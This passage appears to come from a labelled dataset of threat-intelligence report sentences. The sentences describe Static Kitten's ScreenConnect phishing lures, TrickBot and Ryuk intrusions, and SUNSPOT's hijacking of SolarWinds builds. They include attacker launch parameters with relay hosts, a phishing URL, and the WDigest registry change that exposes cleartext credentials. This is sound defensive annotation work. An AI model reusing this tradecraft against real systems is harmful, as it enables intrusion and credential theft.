        "id": "cti_reports_filtered/r-78.md:::S9",
        "text": "- Scholarships.zip",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S10",
        "text": "- Scholarships.exe",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S11",
        "text": "- Project.docx",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S12",
        "text": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S13",
        "text": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S14",
        "text": "A similar second sample uses .docx file that tries to direct users to ws.onehub[.]com/files/94otjyvd which downloads a ZIP file called \u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S15",
        "text": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S16",
        "text": "An overview of the infection chain is shown in Figure 1below.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S17",
        "text": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S18",
        "text": "The URLs are distributed through phishing emails with lure and decoy documents.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S19",
        "text": "An example lure is shown in Figure 2 below.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S20",
        "text": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S21",
        "text": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S22",
        "text": "A full translation of this document can be viewed in Appendix A.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S23",
        "text": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S24",
        "text": "The second file is a ZIP called \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip (see Figure 3).",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S25",
        "text": "We cannot determine the delivery method for this ZIP, but it is likely similar to the .docx email delivery method of the first download URL.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S26",
        "text": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S27",
        "text": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S28",
        "text": ".",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S29",
        "text": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S30",
        "text": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S31",
        "text": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S32",
        "text": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S33",
        "text": "This lead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools, and banker Trojans.[7]",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S34",
        "text": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S35",
        "text": "Remote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they offer.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S36",
        "text": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S37",
        "text": "ScreenConnect\u2019s capabilities are shown in Table 1 below.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S38",
        "text": "\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod.gov.kw.exe\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S39",
        "text": "When a user tries to double click the executable \u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod.gov.kw.exe (Screenconnect payload), it drops the Microsoft installer file.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S40",
        "text": "This begins the installation of the client payload onto victim machines.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S41",
        "text": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S42",
        "text": "The client service launch parameters are: \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\\ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-uwct38-relay.screenconnect.com&p=443&s=defc756e-8027-47b6-b67f-400b5152b0f9&k=BgIAAACkAABSU0ExAAgAAAEAAQAtuFTxmBL02KmPrJD46iRMPemIxmEf5ugjlUMfa193CjLMeH9pna2eM0ZGHYhe3MZHUEAByA4fhpInP5kKnkrPl%2fjhxwjHSIaKZ%2bMobL27iSLf8tgmCtGJTTZndViJcMcp4v0yqJOMxVuUdPraZ%2fTvrw6wZpECq7LCGncZGOri%2fqQVFUqsIDZZzhQye6zfkCg0DgxxPf4aQzjgqQo20dJeQDIEEb0sy7FPiSde3VVxTmp%2fMB3Ho%2bK3mobu743glaeTOq0aIsvXASRKb5xB1f4pFUMi1mETUoGgWL%2f6qhNk65scRZmECWvs7O8ajulQMiSPQj9lUOejdBR9taEB8Byz&t=&c=mofa&c=mofa.gov.kw&c=mofa&c=pc&c=&c=&c=&c=\".\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S43",
        "text": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S44",
        "text": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S45",
        "text": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S46",
        "text": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S47",
        "text": "- &c=mofa",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S48",
        "text": "- &c=mofa.gov.kw",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S49",
        "text": "These parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S50",
        "text": "In this example the infected target is MOFA.\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S51",
        "text": "\u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe\n",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S52",
        "text": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S53",
        "text": "\"C:\\Program Files (x86)\\ScreenConnect Client (03b9d0ec9210f109)\\ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-sy9at2-relay.screenconnect.com&p=443&s=6a1e6739-ad4f-4759-8c69-dfe896b9a817&k=BgIAAACkAABSU0ExAAgAAAEAAQCVzMmjXhdfu5xyqTHPWDSj9Qjbq%2bQlIQursvinhHWO9UWKiTPrrR7quzVCpids4AagFWBCbS6cfow4bTxdtZyrd%2fNQQRVUcQ%2f%2boszJVH6S1JEpmF6ZPruFKyy1yr%2fEuxhNcHAWNf0CQKhhVsK0rXVlRE%2b4%2f4v%2fk%2f7%2bHPg2kwhmBHFZTJVd7xADVdVuYESMiCmu4gx8Akf9aAE2RUz9LjSiCU6LwJtp4AjjMCaGLFSaragsfZ1e%2fD9UEEee8n0J69HLcLoY%2fW8w8RKqQXILC9S3ONSkepA4UHcptKwP5GXogluNbG7UdgiaynRL%2b31oTHOZ32giSoxHDGHc3WphKwDv&t=&c=mfa&c=mfa.gov&c=mfa&c=pc&c=&c=&c=&c=\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S54",
        "text": "The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA: &c=mfa&c=mfa.gov\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S0",
        "text": "While the use of malicious attachments in spam emails is the most common initial access vector \u2014 determined across multiple CrowdStrike investigations \u2014 the available data from these investigations had either been removed or \u201caged off\u201d the systems (i.e., dispersed due to the passage of time) before CrowdStrike Services could confirm the source.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S1",
        "text": "In cases where spam attachments could be verified \u2014 once a user has opened the attachment and enabled macro functionality \u2014 a PowerShell script downloads either Emotet, Bokbot or Trickbot, with the end payload being TrickBot.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S2",
        "text": "Within hours of TrickBot being executed, additional TrickBot modules are installed for network reconnaissance and credential theft.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S3",
        "text": "Trickbot is installed as a scheduled task, using names like \u201cWinDotNet,\u201d \u201cGoogleTask,\u201d or \u201cSysnetsf\u201d to masquerade as legitimate-appearing processes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S4",
        "text": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S5",
        "text": "The subdirectories also use similarly misleading names like \u201cWinDefrag\u201d or \u201cNetSocket\u201d to appear innocuous.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S6",
        "text": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S7",
        "text": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S8",
        "text": "These services launch a Base64-encoded PowerShell script that will fetch the full PowerShell Empire code from a remote IP.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S9",
        "text": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S10",
        "text": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S11",
        "text": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S12",
        "text": "- Registry Key: HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n",
        "type": "REGISTRYKEY"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S13",
        "text": "- Value: UseLogonCredential\n",
        "type": "REGISTRYKEY"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S14",
        "text": "- Data: 1\n",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S15",
        "text": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S16",
        "text": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S17",
        "text": "Newer versions also dump passwords for applications such as PuTTY, VNC and RDP.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S18",
        "text": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S19",
        "text": "The TrickBot modules used for discovery include networkdll and psfin .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S20",
        "text": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S21",
        "text": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S22",
        "text": "The psfin module has a similar purpose but specifically searches for financial and point-of-sales indicators.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S23",
        "text": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S24",
        "text": "This process can take several iterations of harvesting credentials, connecting to new systems and establishing persistence.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S25",
        "text": "For the incidents observed, this stage of the attack can last from a few days to a few months.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S26",
        "text": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S27",
        "text": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S28",
        "text": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S29",
        "text": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S30",
        "text": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S31",
        "text": "Being the \u201cnoisiest\u201d part of the operation, it is usually accomplished as quickly as possible to minimize chances of detection, as all of the necessary preliminary work has already been completed.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S32",
        "text": "In observed instances, the deployment and execution of Ryuk occurred in one session, typically lasting 3 to 8 hours.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S0",
        "text": "SUNSPOT was identified on disk with a filename of taskhostsvc.exe (SHA256 Hash: c45c9bda8db1d470f1fd0dcc346dc449839eb5ce9a948c70369230af0b3ef168 ), and internally named taskhostw.exe by its developers.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S1",
        "text": "It was likely built on 2020-02-20 11:40:02, according to the build timestamp found in the binary, which is consistent with the currently assessed StellarParticle supply chain attack timeline.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S2",
        "text": "StellarParticle operators maintained the persistence of SUNSPOT by creating a scheduled task set to execute when the host boots.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S3",
        "text": "When SUNSPOT executes, it creates a mutex named {12d61a41-4b74-7610-a4d8-3028d2f56395} to ensure only one instance is running.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S4",
        "text": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S5",
        "text": "Individual log entries are encrypted with the stream cipher RC4, using the hard-coded key FC F3 2A 83 E5 F6 D0 24 A6 BF CE 88 30 C2 48 E7 .",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S6",
        "text": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S7",
        "text": "Log entries are delineated by the hex string 32 78 A5 E7 1A 79 91 AC and begin with the number of seconds elapsed since the first log line.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S8",
        "text": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S9",
        "text": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S10",
        "text": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S11",
        "text": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S12",
        "text": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S13",
        "text": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S14",
        "text": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S15",
        "text": "Copies of MsBuild.exe are identified by hashing the name of each running process and comparing it to the corresponding value, 0x53D525 .",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S16",
        "text": "The hashing algorithm used for the comparison is ElfHash and is provided in Python in Figure 1.\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S17",
        "text": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S18",
        "text": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S19",
        "text": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S20",
        "text": "If this mutex is found, the backdoor interprets it as a signal to quit, waits for the completion of its currently running backdoor injection threads, and exits.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S21",
        "text": "This mutex was likely intended to be used by StellarParticle operators to discreetly stop the malware, instead of using a riskier method such as killing the process.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S22",
        "text": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S23",
        "text": "The malware extracts the command-line arguments for each running MsBuild.exe process from the virtual memory using a methodology similar to one publicly documented1.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S24",
        "text": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S25",
        "text": "The latter is read to get the full command line passed to the MsBuild.exe process.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S26",
        "text": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S27",
        "text": "This value is hard-coded in the binary, in an encrypted form using AES128-CBC, whose parameters are given below.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S28",
        "text": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S29",
        "text": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S30",
        "text": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S31",
        "text": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S32",
        "text": "While SUNSPOT supports replacing multiple files, the identified copy only replaces InventoryManager.cs .\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S33",
        "text": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S34",
        "text": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S35",
        "text": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S36",
        "text": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S37",
        "text": "The original source file is copied with a .bk extension (e.g., InventoryManager.bk ), to back up the original content.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S38",
        "text": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S39",
        "text": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S40",
        "text": "SUNSPOT appends an entry in the log file with the date and time of the backdoor attempt and waits for the MsBuild.exe process to exit before restoring the original source code and deleting the temporary InventoryManager.bk file.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S41",
        "text": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S42",
        "text": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S43",
        "text": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S44",
        "text": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S45",
        "text": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S46",
        "text": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S47",
        "text": "- Persistence using scheduled tasks, triggered at boot time\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S48",
        "text": "- Use of AES128-CBC to protect the targeted source code files and the backdoored source code file in the binary\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S49",
        "text": "- Use of RC4 encryption with a hard-coded key to protect the log file entries\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S50",
        "text": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S51",
        "text": "- Log file creation in the system temp directory C:\\Windows\\Temp\\vmware-vmdmp.log masquerading as a legitimate VMWare log file",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S52",
        "text": "- Detection of the targeted Visual Studio solution build by reading the virtual memory of MsBuild.exe processes, looking for the targeted solution filename\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S53",
        "text": "- Access to the remote process arguments made via the remote process\u2019s PEB structure\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S54",
        "text": "- Replacement of source code files during the build process, before compilation, by replacing file content with another version containing SUNBURST",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S55",
        "text": "- Insertion of the backdoor code within #pragma statements disabling and restoring warnings, to prevent the backdoor code lines from appearing in build logs\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S56",
